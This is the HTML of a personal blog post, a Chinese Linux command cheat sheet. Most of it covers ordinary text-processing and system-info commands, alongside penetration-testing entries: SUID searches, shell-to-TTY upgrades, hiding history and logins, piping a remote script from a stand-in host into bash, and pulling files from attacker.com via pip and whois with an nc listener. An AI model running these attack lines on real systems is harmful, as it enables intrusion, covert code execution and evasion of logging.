@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="linux部分命令速查 for me。 命令行的艺术">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux部分实用命令">
+<meta property="og:url" content="http://atsud0.me/2020/04/14/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="linux部分命令速查 for me。 命令行的艺术">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-04-14T04:41:08.000Z">
+<meta property="article:modified_time" content="2021-01-19T06:17:53.318Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://atsud0.me/2020/04/14/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Linux部分实用命令 | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/04/14/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux部分实用命令
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-04-14 12:41:08" itemprop="dateCreated datePublished" datetime="2020-04-14T12:41:08+08:00">2020-04-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-01-19 14:17:53" itemprop="dateModified" datetime="2021-01-19T14:17:53+08:00">2021-01-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Note/" itemprop="url" rel="index"><span itemprop="name">Note</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>4.2k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>4 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>linux部分命令速查 for me。</p>
+<a href="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md" title="" target="">命令行的艺术</a>
+<a id="more"></a>
+
+<p>获取命令帮助的网站<br><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">gtfobins</a><br><a href="https://www.runoob.com/linux/linux-command-manual.html" target="_blank" rel="noopener">Runoob</a></p>
+<h3 id="查看用户-用户组"><a href="#查看用户-用户组" class="headerlink" title="查看用户|用户组"></a>查看用户|用户组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">cat &#x2F;etc&#x2F;group</span><br></pre></td></tr></table></figure>
+<p>linux中存放用户密码的文件<br><code>/etc/shadow</code> 加密过得~ </p>
+<h3 id="显示某个文件的第几行"><a href="#显示某个文件的第几行" class="headerlink" title="显示某个文件的第几行"></a>显示某个文件的第几行</h3><p>显示文件的5到20行<br><code>sed -n &#39;5,20p&#39; firename</code></p>
+<h3 id="删除文本换行符和空格"><a href="#删除文本换行符和空格" class="headerlink" title="删除文本换行符和空格"></a>删除文本换行符和空格</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#39;&#123;printf(&quot;%s&quot;,$0)&#125;&#39; tmp.txt | sed &#39;s&#x2F;\ &#x2F;&#x2F;g&#39; $1</span><br></pre></td></tr></table></figure>
+
+<h3 id="linux-下删除文本空行"><a href="#linux-下删除文本空行" class="headerlink" title="linux 下删除文本空行"></a>linux 下删除文本空行</h3><p>grep</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v &#39;^$&#39; file</span><br></pre></td></tr></table></figure>
+<p>sed</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#39;&#x2F;^$&#x2F;d&#39; file</span><br></pre></td></tr></table></figure>
+<p> awk</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#39;&#x2F;.&#x2F; &#123;print&#125;&#39; file 或 awk &#39;&#123;if($0!&#x3D;&quot; &quot;) print&#125;&#39;</span><br></pre></td></tr></table></figure>
+<p>tr</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tr -s &quot;n&quot;</span><br></pre></td></tr></table></figure>
+<p>除此之外，vim也可以在查看时。通过命令模式删除空行。vim在命令模式下输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s&#x2F;^n&#x2F;&#x2F;g</span><br></pre></td></tr></table></figure>
+<p>意思是全局替换所有以回车开头的字符，替换为空。如果有多个连续的空行，想保留一行。则只需在命令行模式输入下行即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s&#x2F;^n$&#x2F;&#x2F;g</span><br></pre></td></tr></table></figure>
+<h3 id="linux-shell-字符串反转-rev"><a href="#linux-shell-字符串反转-rev" class="headerlink" title="linux shell 字符串反转 rev"></a>linux shell 字符串反转 rev</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo $PATH|rev</span><br><span class="line">lrep_eroc&#x2F;nib&#x2F;rsu&#x2F;:lrep_rodnev&#x2F;nib&#x2F;rsu&#x2F;:lrep_etis&#x2F;nib&#x2F;rsu&#x2F;:nib&#x2F;rsu&#x2F;:nib&#x2F;lacol&#x2F;rsu&#x2F;:nibs&#x2F;lacol&#x2F;rsu&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="linux-shell-base64"><a href="#linux-shell-base64" class="headerlink" title="linux shell base64"></a>linux shell base64</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo $PATH|base64</span><br><span class="line">L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvYmluOi91c3IvYmluL3NpdGVfcGVy</span><br><span class="line">bDovdXNyL2Jpbi92ZW5kb3JfcGVybDovdXNyL2Jpbi9jb3JlX3BlcmwK</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">在线加密解密</a></p>
+<h3 id="查找SUID位的文件"><a href="#查找SUID位的文件" class="headerlink" title="查找SUID位的文件"></a>查找SUID位的文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line">find &#x2F; -perm &#x2F;4000 2&gt;&amp;1 | grep -v “Permission denied”</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看Linux内核-系统版本"><a href="#查看Linux内核-系统版本" class="headerlink" title="查看Linux内核/系统版本"></a>查看Linux内核/系统版本</h3><p>cat /proc/version</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;version</span><br><span class="line">Linux version 5.5.13-arch2-1 (linux@archlinux) (gcc version 9.3.0 (Arch Linux 9.3.0-1)) #1 SMP PREEMPT Mon, 30 Mar 2020 20:42:41 +0000</span><br></pre></td></tr></table></figure>
+<p>uname -a</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux sds0 5.5.13-arch2-1 #1 SMP PREEMPT Mon, 30 Mar 2020 20:42:41 +0000 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>
+<p>lsb_release -a</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br><span class="line">LSB Version:    1.4</span><br><span class="line">Distributor ID: Arch</span><br><span class="line">Description:    Arch Linux</span><br><span class="line">Release:        rolling</span><br><span class="line">Codename:       n&#x2F;a</span><br></pre></td></tr></table></figure>
+<p>cat /etc/issue</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">Arch Linux \r (\l)</span><br></pre></td></tr></table></figure>
+
+<h3 id="curl-部分用法"><a href="#curl-部分用法" class="headerlink" title="curl 部分用法"></a>curl 部分用法</h3><p>模拟浏览器发送get请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
+<p>发送POST请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -d &quot;flagpls&#x3D;flagpls&quot; http:&#x2F;&#x2F;ip</span><br></pre></td></tr></table></figure>
+<p><strong>在浏览器开发者工具存储器中可设置cookie</strong></p>
+<p>获取可进行的请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;..... -X OPTIONS -v</span><br></pre></td></tr></table></figure>
+
+<p>设置User-agent，不设置ua默认的是curl/curl的版本号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: curl&#x2F;7.64.1</span><br><span class="line"></span><br><span class="line">那么怎么设置呢？</span><br><span class="line"> -A, --user-agent &lt;name&gt; Send User-Agent &lt;name&gt; to server</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com -A <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'</span></span><br></pre></td></tr></table></figure>
+
+<p>如果抓包的话就会发现请求包头的UA字段变成了上面那个了。</p>
+<h3 id="wget部分用法"><a href="#wget部分用法" class="headerlink" title="wget部分用法"></a>wget部分用法</h3><p>wget设置UA下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --user-agent&#x3D;&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;76.0.3809.132 Safari&#x2F;537.36&quot; url</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="python打开tty"><a href="#python打开tty" class="headerlink" title="python打开tty"></a>python打开tty</h3><a href="https://cloud.tencent.com/developer/article/1047405" title="" target="">如何将简单的Shell转换成为完全交互式的TTY</a>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="没有python怎么打开tty"><a href="#没有python怎么打开tty" class="headerlink" title="没有python怎么打开tty?"></a>没有python怎么打开tty?</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;bash script -q &#x2F;dev&#x2F;null</span><br><span class="line">Ctrl-Z</span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line">reset</span><br><span class="line">xterm</span><br></pre></td></tr></table></figure>
+
+<h3 id="python部署简易网站"><a href="#python部署简易网站" class="headerlink" title="python部署简易网站"></a>python部署简易网站</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer # 不指定端口默认8000</span><br><span class="line">python -m http.server</span><br><span class="line">python3 -m updog --ssl --password 123456 -p 80 #不是自带库，需要安装。</span><br></pre></td></tr></table></figure>
+
+<h3 id="curl-wget-不验证证书进行https请求"><a href="#curl-wget-不验证证书进行https请求" class="headerlink" title="curl wget 不验证证书进行https请求"></a>curl wget 不验证证书进行https请求</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget &#39;https:&#x2F;&#x2F;x.x.x.x&#x2F;get_ips&#39; --no-check-certificate</span><br><span class="line">curl &#39;https:&#x2F;&#x2F;x.x.x.x&#x2F;get_ips&#39; -k</span><br></pre></td></tr></table></figure>
+
+<h3 id="设置term"><a href="#设置term" class="headerlink" title="设置term"></a>设置term</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export TERM&#x3D;xterm</span><br></pre></td></tr></table></figure>
+
+<h3 id="Arch-查询滚了多少次-…"><a href="#Arch-查询滚了多少次-…" class="headerlink" title="Arch 查询滚了多少次(…)"></a>Arch 查询滚了多少次(…)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $(head -n1 &#x2F;var&#x2F;log&#x2F;pacman.log | cut -d &quot; &quot; -f 1,2) 以来一共滚了 $(grep -c &quot;full system upgrade&quot; &#x2F;var&#x2F;log&#x2F;pacman.log) 次</span><br></pre></td></tr></table></figure>
+
+<h3 id="渗透过程中不记录历史命令"><a href="#渗透过程中不记录历史命令" class="headerlink" title="渗透过程中不记录历史命令"></a>渗透过程中不记录历史命令</h3><p><code>export HISTFILE=/dev/null</code> 将HISTFILE设置为/dev/null</p>
+<p><code>cat | zsh</code>隐身模式。</p>
+<p>避免登录被记录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@127.0.0.1 sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="无文件落地执行"><a href="#无文件落地执行" class="headerlink" title="无文件落地执行"></a>无文件落地执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L http://aaaa.com/a.sh|bash</span><br><span class="line">/bin/bash -c <span class="string">"<span class="variable">$(curl -fsSL https://aaaa/a.sh)</span>"</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Dos格式文件快速转为Unix"><a href="#Dos格式文件快速转为Unix" class="headerlink" title="Dos格式文件快速转为Unix"></a>Dos格式文件快速转为Unix</h3><p>使用vi</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set fileformat&#x3D;unix</span><br><span class="line">:w</span><br></pre></td></tr></table></figure>
+
+<p>dos2unix</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dos2unix filename</span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux使用impakcet快速开启一个SMB共享目录"><a href="#Linux使用impakcet快速开启一个SMB共享目录" class="headerlink" title="Linux使用impakcet快速开启一个SMB共享目录"></a>Linux使用<code>impakcet</code>快速开启一个SMB共享目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /usr/share/doc/python3-impacket/exapmles/smbserver.py -comment <span class="string">"My Share"</span> TMP /tmp</span><br></pre></td></tr></table></figure>
+
+<h3 id="PIP下载文件"><a href="#PIP下载文件" class="headerlink" title="PIP下载文件"></a>PIP下载文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">export URL&#x3D;http:&#x2F;&#x2F;attacker.com&#x2F;file_to_get</span><br><span class="line"></span><br><span class="line">export LFILE&#x3D;&#x2F;tmp&#x2F;file_to_save</span><br><span class="line"></span><br><span class="line">TF&#x3D;\$(mktemp -d)</span><br><span class="line"></span><br><span class="line">echo &#39;import sys; from os import environ as e</span><br><span class="line"></span><br><span class="line">if sys.version_info.major &#x3D;&#x3D; 3: import urllib.request as r</span><br><span class="line"></span><br><span class="line">else: import urllib as r</span><br><span class="line"></span><br><span class="line">r.urlretrieve(e[&quot;URL&quot;], e[&quot;LFILE&quot;])&#39; \&gt; \$TF&#x2F;setup.py</span><br><span class="line"></span><br><span class="line">pip install \$TF</span><br></pre></td></tr></table></figure>
+
+<h3 id="whois传输文件"><a href="#whois传输文件" class="headerlink" title="whois传输文件"></a>whois传输文件</h3><p>攻击机执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 12345 &lt; &quot;abc&quot;</span><br><span class="line"></span><br><span class="line">## 传递二进制文件</span><br><span class="line">base64 &quot;file_to_send&quot; \| nc -l -p 12345</span><br></pre></td></tr></table></figure>
+
+<p>靶机执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RHOST&#x3D;attacker.com</span><br><span class="line">RPORT&#x3D;12345</span><br><span class="line">LFILE&#x3D;file_to_save</span><br><span class="line">whois -h \$RHOST -p \$RPORT \&gt; &quot;\$LFILE&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="切换java版本"><a href="#切换java版本" class="headerlink" title="切换java版本"></a>切换java版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --config java</span><br></pre></td></tr></table></figure>
+
+<h3 id="编译32位且动态链接库文件很老的二进制文件"><a href="#编译32位且动态链接库文件很老的二进制文件" class="headerlink" title="编译32位且动态链接库文件很老的二进制文件"></a>编译32位且动态链接库文件很老的二进制文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wl,--<span class="built_in">hash</span>-style=both -m32 -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="nohup"><a href="#nohup" class="headerlink" title="nohup"></a>nohup</h3><p>如果用ssh连接服务器，在ssh连接中断后，在ssh下开启的后台命令什么的都会被中断掉。但是有时候会有些任务持续的时间很长，那么可以使用nohup命令. 该命令可以在你退出帐户/关闭终端之后继续运行相应的进程. nohup就是不挂起的意思。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup tcpdump -i eth0 -w a.pcap &amp;</span><br></pre></td></tr></table></figure>
+
+<p>之后tcpdump用户就会执行这个进程，在你ssh会话挂了之后此任务还会继续进行。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/04/14/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/" title="Linux部分实用命令">http://atsud0.me/2020/04/14/Linux部分实用命令/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/14/TryHackMe-Kenobi/" rel="prev" title="TryHackMe-Kenobi">
+      <i class="fa fa-chevron-left"></i> TryHackMe-Kenobi
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/14/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB/" rel="next" title="渗透知识汇总">
+      渗透知识汇总 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
